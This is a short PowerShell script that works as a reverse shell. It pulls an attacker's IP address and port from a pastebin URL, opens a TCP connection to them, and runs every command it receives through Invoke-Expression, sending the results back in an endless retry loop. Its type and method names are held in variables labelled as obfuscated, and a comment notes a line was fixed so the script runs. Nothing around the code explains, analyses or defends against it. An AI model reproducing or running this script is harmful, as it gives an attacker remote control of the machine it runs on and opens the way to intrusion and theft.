$obfuscatedVar1 = 'https://pastebin.com/raw/1H0YZ1z8'
$obfuscatedVar2 = 'Invoke-RestMethod'
$obfuscatedVar3 = 'System.Net.Sockets.TCPClient'
$obfuscatedVar4 = 'System.Text.ASCIIEncoding'
$obfuscatedVar5 = 'System.Text.Encoding'

While($true) {
    Try { 
        $pastebinContent = & $obfuscatedVar2 -Uri $obfuscatedVar1
        $ip, $port = $pastebinContent -split ':'
        $client = New-Object $obfuscatedVar3($ip, $port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName $obfuscatedVar4).GetString($bytes, 0, $i)
            $sendback = (iex $data 2>&1 | Out-String)
            $sendback2 = ($sendback + 'PS ' + (pwd).Path + '> ')
            $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2)  # Fixed this line
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
    } Catch {
        Write-Host "Connection failed. Retrying in 5 seconds..."
        Start-Sleep -Seconds 5
    }
}